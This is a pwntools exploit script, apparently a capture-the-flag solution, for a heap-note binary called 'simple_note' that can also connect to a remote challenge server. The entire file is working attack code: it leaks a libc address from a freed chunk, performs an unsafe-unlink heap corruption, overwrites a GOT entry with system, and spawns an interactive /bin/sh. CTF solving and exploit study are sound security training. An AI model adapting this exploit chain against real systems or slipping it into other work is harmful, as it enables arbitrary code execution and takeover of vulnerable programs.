from pwn import *
import sys, time

#context.log_level="DEBUG"
context.binary="/home/vagrant/sharedFolder/Simple_note/simple_note"
binary = ELF("/home/vagrant/sharedFolder/Simple_note/simple_note")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc=ELF("/home/vagrant/sharedFolder/Simple_note/libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71")
if len(sys.argv) == 1:
    p=process("/home/vagrant/sharedFolder/Simple_note/simple_note")

    log.info("PID: "+str(p.proc.pid))
    #pause()

else:
    p=remote("pwn1.chal.ctf.westerns.tokyo",16317)

def add(size, data):
    p.recvuntil("choice: \n")
    p.sendline("1")
    p.recvuntil("size: \n")
    p.sendline(str(size))
    p.recvuntil("note: \n")
    p.sendline(data)

def delete(idx):
    p.recvuntil("choice: \n")
    p.sendline("2")
    p.recvuntil("index: \n")
    p.sendline(str(idx))
    p.recvuntil("Sucess!\n")

def show(idx):
    p.recvuntil("choice: \n")
    p.sendline("3")
    p.recvuntil("index: \n")
    p.sendline(str(idx))
    p.recvuntil("Note: \n")

def edit(idx, data):
    p.recvuntil("choice: \n")
    p.sendline("4")
    p.recvuntil("index: \n")
    p.sendline(str(idx))
    p.recvuntil("note: \n")
    p.sendline(data)


def main():
    add(0x88, "A"*188)
    add(0x88, "B"*188)
    add(0x88, "C"*188)
    add(0x88, "D"*188)
    add(0x88, "E"*188)
    add(0x88, "F"*188)
    add(0x88, "G"*188)
    delete(0)
    add(0x88, "C"*7)
    show(0)

    offset=0x3c27b8

    p.recvuntil("C"*7+"\n")
    leak=u64(p.recv(6).ljust(8,"\x00"))
    libc_base=leak-offset
    log.info("Leaked arena: {}".format(hex(leak)))
    log.info("Leaked libc: {}".format(hex(libc_base)))
    system=libc_base+libc.symbols["system"]
    log.info("Leaked system: {}".format(hex(system)))
    binsh=libc_base+next(libc.search("/bin/sh\x00"))
    log.info("Leaked binsh: {}".format(hex(binsh)))

    bss_ptr=0x6020c0+8*3
    exp=flat(p64(0x0),p64(0x80)+p64(bss_ptr-24)+p64(bss_ptr-16),"A"*0x60,p64(0x80),p64(0x90))

    edit(3,exp)

    delete(4)

    edit(3,p32(0x602058))
    #raw_input("[DEBUG]: {}".format(p.proc.pid))
    edit(0,p64(system))
    p.sendline("/bin/sh;")
    p.clean()
    p.interactive()
    #raw_input("[DEBUG]: {}".format(p.proc.pid))




if __name__ == '__main__':
    main()
